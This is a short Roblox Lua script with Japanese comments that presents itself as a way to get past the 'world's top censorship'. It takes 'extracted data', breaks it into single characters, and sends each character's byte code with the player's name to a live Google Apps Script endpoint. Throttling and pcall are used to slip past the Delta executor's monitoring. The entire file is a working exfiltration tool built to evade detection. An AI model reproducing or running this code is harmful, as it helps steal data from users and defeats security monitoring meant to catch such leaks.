-- [[ 世界一位の検閲を抜ける「一文字パズル」送信スクリプト ]]
local data = "ここに抜き取ったデータ（テストなら 'Hello World'）を入れる"
local url = "https://script.google.com/macros/s/AKfycbxjMT9nLxBsVZK-UQKeiixoVkk6j76hYLZGCAj1-VNUrgwSILbuw7qviyynNo47O0ET/exec"
local user = game.Players.LocalPlayer.Name

print("🛰️ ゲリラ通信、シークエンス開始...")

for i = 1, #data do
    local char = data:sub(i, i)
    local charCode = string.byte(char) -- 文字を数値（65とか）に変換
    
    -- 送信URLの構築（mode=stream を忘れずに）
    local finalUrl = url .. "?mode=stream&user=" .. user .. "&char=" .. tostring(charCode)
    
    -- Deltaの検閲（Line 17の死神）を pcall で黙らせる
    local success, err = pcall(function()
        return game:HttpGet(finalUrl)
    end)
    
    if not success then
        warn("⚠️ 一文字送信に失敗（検閲の可能性あり）: " .. tostring(err))
    else
        print("✅ 送信中 (" .. i .. "/" .. #data .. "): " .. char)
    end
    
    -- 0.3秒のディレイ。これが速すぎるとDeltaの監視に引っかかる
    task.wait(0.3)
end

print("🏁 ミッション完了。スプレッドシートを確認しろ！")
